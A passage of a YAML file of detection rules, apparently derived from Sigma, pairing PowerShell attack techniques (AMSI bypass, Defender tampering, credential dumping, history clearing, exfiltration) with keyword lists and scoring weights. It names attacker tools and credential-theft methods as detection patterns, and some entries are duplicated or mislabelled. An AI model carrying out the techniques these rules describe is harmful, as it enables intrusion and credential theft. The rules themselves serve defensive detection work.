      regex_any:
      - suspicious
      - powershell
      - download
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_71ff406e_b633_4989_96ec_bc49d825a412
  intent: data_staging
  tactic: collection
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  conditions:
    summary:
      regex_any:
      - folder
      - with
      - powershell
      - staging
      - temp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ec19ebab_72dc_40e1_9728_4c0b805d722c
  intent: defense_evasion
  tactic: defense_evasion
  description: Attempting to disable scheduled scanning and other parts of Windows
    Defender ATP or set default actions to allow.
  conditions:
    summary:
      regex_any:
      - tamper
      - windows
      - defender
      - psclassic
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df9a0e0e_fedb_4d6c_8668_d765dfc92aa7
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects suspicious use of the WSMAN provider without PowerShell.exe
    as the host application.
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - wsman
      - provider
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_74176142_4684_4d8a_8b0a_713257e7df8e
  intent: impact_operations
  tactic: impact
  description: Detects usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dl"
    DLL. Which is often used by attackers to perform AD enumeration.
  conditions:
    summary:
      regex_any:
      - potential
      - active
      - directory
      - enumeration
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_64e8e417_c19a_475a_8d19_98ea705394cc
  intent: execution
  tactic: execution
  description: Detects alternate PowerShell hosts potentially bypassing detections
    looking for powershell.exe
  conditions:
    summary:
      regex_any:
      - alternate
      - powershell
      - hosts
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8d31a8ce_46b5_4dd6_bdc3_680931f1db86
  intent: execution
  tactic: execution
  description: 'focuses on trivial artifacts observed in variants of prevalent offensive
    ps1 payloads, including

    Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other
    attack payloads

    that often undergo minimal changes by attackers due to bad opsec.

    '
  conditions:
    summary:
      regex_any:
      - opsec
      - powershell
      - code
      - artifacts
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f99276ad_d122_4989_a09a_d00904a5f9d2
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects keywords that could indicate clearing PowerShell history
  conditions:
    summary:
      regex_any:
      - clear
      - powershell
      - history
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_41025fd7_0466_4650_a813_574aaacbe7f4
  intent: execution
  tactic: execution
  description: Detects the execution of known offensive powershell scripts used for
    exploitation or reconnaissance
  conditions:
    summary:
      regex_any:
      - malicious
      - powershell
      - scripts
      - poshmodule
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b140afd9_474b_4072_958e_2ebb435abd68
  intent: credential_harvesting
  tactic: credential_access
  description: Detects suspicious invocation of the Get-ADDBAccount script that reads
    from a ntds.dit file and may be used to get access to credentials without using
    any credential dumpers
  conditions:
    summary:
      regex_any:
      - suspicious
      - addbaccount
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4cbd4f12_2e22_43e3_882f_bff3247ffb78
  intent: data_staging
  tactic: collection
  description: A General detection for the Get-Clipboard commands in PowerShell logs.
    This could be an adversary capturing clipboard contents.
  conditions:
    summary:
      regex_any:
      - powershell
      - clipboard
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9fe55ea2_4cd6_4491_8a54_dd6871651b51
  intent: lateral_movement
  tactic: lateral_movement
  description: 'Detects the execution of Evil-WinRM via PowerShell Module logs by
    leveraging the hardcoded strings inside the utility.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - evil
      - winrm
      - execution
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a136cde0_61ad_4a61_9b82_8dc490e60dd2
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Clip.exe to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_2f211361_7dce_442d_b78a_c04039677378
  intent: execution
  tactic: execution
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the code block cited in the reference
    section below
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - obfuscated
      - invocation
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9ac8b09b_45de_4a07_9da1_0de8c09304a3
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of stdin to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_6bfb8fa7_b2e7_4f6c_8d9d_824e5d06ea9e
  intent: execution
  tactic: execution
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7034cbbb_cc55_4dc2_8dad_36c0b942e8f1
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - compress
      - obfuscation
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a23791fe_8846_485a_b16b_ca691e1b03d4
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll
      - launcher
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c72aca44_8d52_45ad_8f81_f96c4d3c755e
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via Stdin in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - stdin
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ebdf49d8_b89c_46c9_8fdf_2c308406f6bd
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - clip
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_07ad2ea8_6a55_4ac6_bf3e_91b8e59676eb
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - mshta
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_88a22f69_62f9_4b8a_aa00_6b0212f2f05a
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - rundll32
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f3c89218_8c3d_4ba9_9974_f1d8e6a1b4a6
  intent: execution
  tactic: execution
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  conditions:
    summary:
      regex_any:
      - invoke
      - obfuscation
      - launcher
      - obfuscation
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_7d0d0329_0ef1_4e84_a9f5_49500f9d7c6c
  intent: reconnaissance
  tactic: discovery
  description: Detects Commandlet names from well-known PowerShell exploitation frameworks
  conditions:
    summary:
      regex_any:
      - malicious
      - powershell
      - commandlets
      - poshmodule
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_38a7625e_b2cb_485d_b83d_aff137d859f4
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects PowerShell module creation where the module Contents are set
    to "function Get-VMRemoteFXPhysicalVideoAdapter". This could be a sign of potential
    abuse of the "RemoteFXvGPUDisablement.exe" binary which is known to be vulnerable
    to module load-order hijacking.
  conditions:
    summary:
      regex_any:
      - potential
      - remotefxvgpudisablement
      - abuse
      - powershell
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_96b9f619_aa91_478f_bacb_c3e50f8df575
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects remote PowerShell sessions
  conditions:
    summary:
      regex_any:
      - remote
      - powershell
      - session
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_de41232e_12e8_49fa_86bc_c05c7e722df9
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell download command
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - download
      - poshmodule
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bbb80e91_5746_4fbe_8898_122e2cafdbf4
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell invocation command parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - invocations
      - generic
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8ff28fdd_e2fa_4dfa_aeda_ef3d61c62090
  intent: execution
  tactic: execution
  description: Detects suspicious PowerShell invocation command parameters
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - invocations
      - specific
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e3818659_5016_4811_a73c_dde4679169d2
  intent: unknown
  tactic: initial_access
  description: 'The Reset-ComputerMachinePassword cmdlet changes the computer account
    password that the computers use to authenticate to the domain controllers in the
    domain.

    You can use it to reset the password of the local computer.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - computer
      - machine
      - password
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_daf7eb81_35fd_410d_9d7a_657837e602bb
  intent: data_staging
  tactic: collection
  description: 'Detects PowerShell scripts that make use of the "Compress-Archive"
    Cmdlet in order to compress folders and files where the output is stored in a
    potentially suspicious location that is used often by malware for exfiltration.

    An adversary might compress data (e.g., sensitive documents) that is collected
    prior to exfiltration in order to make it portable and minimize the amount of
    data sent over the network.

    '
  conditions:
    summary:
      regex_any:
      - folder
      - with
      - powershell
      - staging
      - temp
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fe5ce7eb_dad8_467c_84a9_31ec23bd644a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects SyncAppvPublishingServer process execution which usually utilized
    by adversaries to bypass PowerShell execution restrictions.
  conditions:
    summary:
      regex_any:
      - syncappvpublishingserver
      - bypass
      - powershell
      - restriction
      - module
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_91e69562_2426_42ce_a647_711b8152ced6
  intent: impact_operations
  tactic: impact
  description: Detects ADDInternals Cmdlet execution. A tool for administering Azure
    AD and Office 365. Which can be abused by threat actors to attack Azure AD or
    Office 365.
  conditions:
    summary:
      regex_any:
      - aadinternals
      - powershell
      - cmdlets
      - execution
      - psscript
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fc028194_969d_4122_8abe_0470d5b8f12f
  intent: credential_harvesting
  tactic: credential_access
  description: 'Adversaries may acquire credentials from web browsers by reading files
    specific to the target browser.

    Web browsers commonly save credentials such as website usernames and passwords
    so that they do not need to be entered manually in the future.

    Web browsers typically store the credentials in an encrypted format within a credential
    store.

    '
  conditions:
    summary:
      regex_any:
      - access
      - browser
      - login
      - data
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_9e620995_f2d8_4630_8430_4afd89f77604
  intent: impact_operations
  tactic: impact
  description: Detects usage of the "Import-Module" cmdlet to load the "Microsoft.ActiveDirectory.Management.dl"
    DLL. Which is often used by attackers to perform AD enumeration.
  conditions:
    summary:
      regex_any:
      - potential
      - active
      - directory
      - enumeration
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4368354e_1797_463c_bc39_a309effbe8d7
  intent: impact_operations
  tactic: impact
  description: 'Detects powershell scripts that adds a Name Resolution Policy Table
    (NRPT) rule for the specified namespace.

    This will bypass the default DNS server and uses a specified server for answering
    the query.

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - name
      - resolution
      - policy
      - table
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_155c7fd5_47b4_49b2_bbeb_eb4fab335429
  intent: execution
  tactic: execution
  description: Detects usage of the "Add-WindowsCapability" cmdlet to add Windows
    capabilities. Notable capabilities could be "OpenSSH" and others.
  conditions:
    summary:
      regex_any:
      - windows
      - capability
      - powershell
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bf72941a_cba0_41ea_b18c_9aca3925690d
  intent: execution
  tactic: execution
  description: Detects execution of ADRecon.ps1 for AD reconnaissance which has been
    reported to be actively used by FIN7
  conditions:
    summary:
      regex_any:
      - powershell
      - adrecon
      - execution
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e0d6c087_2d1c_47fd_8799_3904103c5a98
  intent: execution
  tactic: execution
  description: Detects code fragments found in small and obfuscated AMSI bypass PowerShell
    scripts
  conditions:
    summary:
      regex_any:
      - amsi
      - bypass
      - pattern
      - assembly
      - gettype
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_fa2559c8_1197_471d_9cdd_05a0273d4522
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of special strings/null bits in order to potentially
    bypass AMSI functionalities
  conditions:
    summary:
      regex_any:
      - potential
      - amsi
      - bypass
      - script
      - using
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3ceb2083_a27f_449a_be33_14ec1b7cc973
  intent: unknown
  tactic: s0363
  description: Detects Silence EmpireDNSAgent as described in the Group-IP report
  conditions:
    summary:
      regex_any:
      - silence
      - detection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_96c982fe_3d08_4df4_bed2_eb14e02f21c8
  intent: reconnaissance
  tactic: discovery
  description: Detects AS-REP roasting is an attack that is often-overlooked. It is
    not very common as you have to explicitly set accounts that do not require pre-authentication.
  conditions:
    summary:
      regex_any:
      - aduser
      - enumeration
      - using
      - useraccountcontrol
      - flags
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_e4f93c99_396f_47c8_bb0f_201b1fa69034
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects potential exfiltration attempt via audio file using PowerShell
  conditions:
    summary:
      regex_any:
      - potential
      - data
      - exfiltration
      - audio
      - file
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_c1dda054_d638_4c16_afc8_53e007f3fbc5
  intent: data_staging
  tactic: collection
  description: Once established within a system or network, an adversary may use automated
    techniques for collecting internal data.
  conditions:
    summary:
      regex_any:
      - automated
      - collection
      - command
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d4a11f63_2390_411c_9adf_d791fd152830
  intent: data_staging
  tactic: collection
  description: 'Adversaries may attempt to take screen captures of the desktop to
    gather information over the course of an operation.

    Screen capturing functionality may be included as a feature of a remote access
    tool used in post-compromise operations

    '
  conditions:
    summary:
      regex_any:
      - windows
      - screen
      - capture
      - with
      - copyfromscreen
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_bde47d4b_9987_405c_94c7_b080410e8ea7
  intent: defense_evasion
  tactic: defense_evasion
  description: Identifies when a user attempts to clear console history. An adversary
    may clear the command history of a compromised account to conceal the actions
    undertaken during an intrusion.
  conditions:
    summary:
      regex_any:
      - clearing
      - windows
      - console
      - history
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_26b692dc_1722_49b2_b496_a8258aa6371d
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects keywords that could indicate clearing PowerShell history
  conditions:
    summary:
      regex_any:
      - clear
      - powershell
      - history
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_363eccc0_279a_4ccf_a3ab_24c2e63b11fb
  intent: persistence_installation
  tactic: persistence
  description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling
    for initial or recurring execution of malicious code
  conditions:
    summary:
      regex_any:
      - powershell
      - create
      - scheduled
      - task
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_db885529_903f_4c5d_9864_28fe199e6370
  intent: reconnaissance
  tactic: discovery
  description: Detects usage of the Get-ADComputer cmdlet to collect computer information
    and output it to a file
  conditions:
    summary:
      regex_any:
      - computer
      - discovery
      - export
      - adcomputer
      - cmdlet
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_63bf8794_9917_45bc_88dd_e1b5abc0ecfd
  intent: credential_harvesting
  tactic: credential_access
  description: Uses PowerShell to install/copy a file into a system directory such
    as "System32" or "SysWOW64"
  conditions:
    summary:
      regex_any:
      - powershell
      - install
      - system
      - directory
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_23590215_4702_4a70_8805_8dc9e58314a2
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may leverage the COR_PROFILER environment variable to
    hijack the execution flow of programs that load the .NET CLR.

    The COR_PROFILER is a .NET Framework feature which allows developers to specify
    an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process
    that loads the Common Language Runtime (CLR).

    These profiliers are designed to monitor, troubleshoot, and debug managed code
    executed by the .NET CLR.

    (Citation: Microsoft Profiling Mar 2017)

    (Citation: Microsoft COR_PROFILER Feb 2013)

    '
  conditions:
    summary:
      regex_any:
      - registry
      - free
      - process
      - scope
      - cor_profiler
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_243de76f_4725_4f2e_8225_a8a69b15ad61
  intent: persistence_installation
  tactic: persistence
  description: Detects creation of a local user via PowerShell
  conditions:
    summary:
      regex_any:
      - powershell
      - create
      - local
      - user
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_afd12fed_b0ec_45c9_a13d_aa86625dac81
  intent: unknown
  tactic: ds0005
  description: Adversaries may attempt to access or create a copy of the Active Directory
    domain database in order to steal credential information
  conditions:
    summary:
      regex_any:
      - create
      - volume
      - shadow
      - copy
      - with
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_d93129cd_1ee0_479f_bc03_ca6f129882e3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Adversaries may employ various system checks to detect and avoid virtualization
    and analysis environments.

    This may include changing behaviors based on the results of checks for the presence
    of artifacts indicative of a virtual machine environment (VME) or sandbox

    '
  conditions:
    summary:
      regex_any:
      - powershell
      - detect
      - virtualization
      - environment
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_1f6399cf_2c80_4924_ace1_6fcff3393480
  intent: reconnaissance
  tactic: discovery
  description: Enumerates Active Directory to determine computers that are joined
    to the domain
  conditions:
    summary:
      regex_any:
      - directorysearcher
      - powershell
      - exploitation
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_b29a93fb_087c_4b5b_a84d_ee3309e69d08
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may create a domain account to maintain access to victim
    systems.

    Domain accounts are those managed by Active Directory Domain Services where access
    and permissions are configured across systems and services that are part of that
    domain..

    '
  conditions:
    summary:
      regex_any:
      - manipulation
      - user
      - computer
      - group
      - security
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_602f5669_6927_4688_84db_0d4b7afb2150
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects scripts or commands that disabled the Powershell command history
    by removing psreadline module
  conditions:
    summary:
      regex_any:
      - disable
      - powershell
      - command
      - history
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99c4658d_2c5e_4d87_828d_7c066ca537c3
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detect built in PowerShell cmdlet Disable-WindowsOptionalFeature,
    Deployment Image Servicing and Management tool.

    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,
    and update features and packages in Windows images

    '
  conditions:
    summary:
      regex_any:
      - disable
      - windowsoptionalfeature
      - command
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ddcd88cb_7f62_4ce5_86f9_1704190feb0a
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of "Reflection.Assembly" load functions to dynamically
    load assemblies in memory
  conditions:
    summary:
      regex_any:
      - potential
      - memory
      - execution
      - using
      - reflection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3c7d1587_3b13_439f_9941_7d14313dbdfe
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects usage of COM objects that can be abused to download files in
    PowerShell by CLSID
  conditions:
    summary:
      regex_any:
      - potential
      - objects
      - download
      - cradles
      - usage
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_846c7a87_8e14_4569_9d49_ecfd4276a01c
  intent: execution
  tactic: execution
  description: 'Detects execution and usage of the DSInternals PowerShell module.
    Which can be used to perform what might be considered as suspicious activity such
    as dumping DPAPI backup keys or manipulating NTDS.DIT files.

    The DSInternals PowerShell Module exposes several internal features of Active
    Directory and Azure Active Directory. These include FIDO2 and NGC key auditing,
    offline ntds.dit file manipulation, password auditing, DC recovery from IFM backups
    and password hash calculation.

    '
  conditions:
    summary:
      regex_any:
      - dsinternals
      - suspicious
      - powershell
      - cmdlets
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_99c49d9c_34ea_45f7_84a7_4751ae6b2cbc
  intent: credential_harvesting
  tactic: credential_access
  description: 'Adversaries may search for common password storage locations to obtain
    user credentials.

    Passwords are stored in several places on a system, depending on the operating
    system or application holding the credentials.

    '
  conditions:
    summary:
      regex_any:
      - dump
      - credentials
      - from
      - windows
      - credential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_991a9744_f2f0_44f2_bd33_9092eba17dc3
  intent: lateral_movement
  tactic: lateral_movement
  description: Adversaries may use Valid Accounts to interact with remote systems
    using Windows Remote Management (WinRM). The adversary may then perform actions
    as the logged-on user.
  conditions:
    summary:
      regex_any:
      - enable
      - windows
      - remote
      - management
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_55c925c1_7195_426b_a136_a9396800e29b
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects usage of the built-in PowerShell cmdlet "Enable-WindowsOptionalFeature"
    used as a Deployment Image Servicing and Management tool.

    Similar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure,
    and update features and packages in Windows images

    '
  conditions:
    summary:
      regex_any:
      - potential
      - suspicious
      - windows
      - feature
      - enabled
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_603c6630_5225_49c1_8047_26c964553e0e
  intent: credential_harvesting
  tactic: credential_access
  description: 'Adversaries may search for common password storage locations to obtain
    user credentials.

    Passwords are stored in several places on a system, depending on the operating
    system or application holding the credentials.

    '
  conditions:
    summary:
      regex_any:
      - enumerate
      - credentials
      - from
      - windows
      - credential
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_115fdba9_f017_42e6_84cf_d5573bf2ddf8
  intent: defense_evasion
  tactic: defense_evasion
  description: Detects usage of powershell cmdlets to disable or remove ETW trace
    sessions
  conditions:
    summary:
      regex_any:
      - disable
      - trace
      - powershell
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_15b7abbb_8b40_4d01_9ee2_b51994b1d474
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects usage of the powerShell Set-Mailbox Cmdlet to set-up an SMTP
    forwarding rule.
  conditions:
    summary:
      regex_any:
      - suspicious
      - powershell
      - mailbox
      - smtp
      - forward
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_aa7a3fce_bef5_4311_9cc1_5f04bb8c308c
  intent: credential_harvesting
  tactic: credential_access
  description: Detects calls to cmdlets inside of PowerShell scripts that are used
    to export certificates from the local certificate store. Threat actors were seen
    abusing this to steal private keys from compromised machines.
  conditions:
    summary:
      regex_any:
      - certificate
      - exported
      - powershell
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_df69cb1d_b891_4cd9_90c7_d617d90100ce
  intent: command_and_control_setup
  tactic: command_and_control
  description: Detects attempts of decoding a base64 Gzip archive in a PowerShell
    script. This technique is often used as a method to load malicious content into
    memory afterward.
  conditions:
    summary:
      regex_any:
      - suspicious
      - frombase64string
      - usage
      - gzip
      - archive
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_95afc12e_3cbb_40c3_9340_84a032e596a3
  intent: persistence_installation
  tactic: persistence
  description: 'Adversaries may execute their own malicious payloads by hijacking
    the Registry entries used by services.

    Adversaries may use flaws in the permissions for registry to redirect from the
    originally specified executable to one that they control, in order to launch their
    own code at Service start.

    Windows stores local service configuration information in the Registry under HKLM\SYSTEM\CurrentControlSet\Services

    '
  conditions:
    summary:
      regex_any:
      - service
      - registry
      - permissions
      - weakness
      - check
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_060c3ef1_fd0a_4091_bf46_e7d625f60b73
  intent: credential_harvesting
  tactic: credential_access
  description: 'The DSInternals PowerShell Module exposes several internal features
    of Active Directory and Azure Active Directory.

    These include FIDO2 and NGC key auditing, offline ntds.dit file manipulation,
    password auditing, DC recovery from IFM backups and password hash calculation.

    '
  conditions:
    summary:
      regex_any:
      - suspicious
      - adreplaccount
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_904e8e61_8edf_4350_b59c_b905fc8e810c
  intent: reconnaissance
  tactic: discovery
  description: 'Detects calls to "get-process" where the output is piped to a "where-object"
    filter to search for security solution processes.

    Adversaries may attempt to get a listing of security software, configurations,
    defensive tools, and sensors that are installed on a system or in a cloud environment.
    This may include things such as firewall rules and anti-virus

    '
  conditions:
    summary:
      regex_any:
      - security
      - software
      - discovery
      - powershell
      - script
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3245cd30_e015_40ff_a31d_5cadd5f377ec
  intent: lateral_movement
  tactic: lateral_movement
  description: Detects the execution of the hacktool Rubeus using specific command
    line flags
  conditions:
    summary:
      regex_any:
      - hacktool
      - rubeus
      - execution
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_851fd622_b675_4d26_b803_14bc7baa517a
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects scriptblock text keywords indicative of potential usge of
    the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.

    '
  conditions:
    summary:
      regex_any:
      - hacktool
      - winpwn
      - execution
      - scriptblock
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_f5d1def8_1de0_4a0e_9794_1f6f27dd605c
  intent: reconnaissance
  tactic: discovery
  description: Detects call to "Win32_QuickFixEngineering" in order to enumerate installed
    hotfixes often used in "enum" scripts by attackers
  conditions:
    summary:
      regex_any:
      - powershell
      - hotfix
      - enumeration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_4c4af3cd_2115_479c_8193_6b8bfce9001c
  intent: data_exfiltration
  tactic: exfiltration
  description: Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries
    may steal data by exfiltrating it over an un-encrypted network protocol other
    than that of the existing command and control channel.
  conditions:
    summary:
      regex_any:
      - powershell
      - icmp
      - exfiltration
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_21f9162c_5f5d_4b01_89a8_b705bd7d10ab
  intent: execution
  tactic: execution
  description: Detects powershell scripts that import modules from suspicious directories
  conditions:
    summary:
      regex_any:
      - import
      - powershell
      - modules
      - from
      - suspicious
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_975b2262_9a49_439d_92a6_0709cccdf0b2
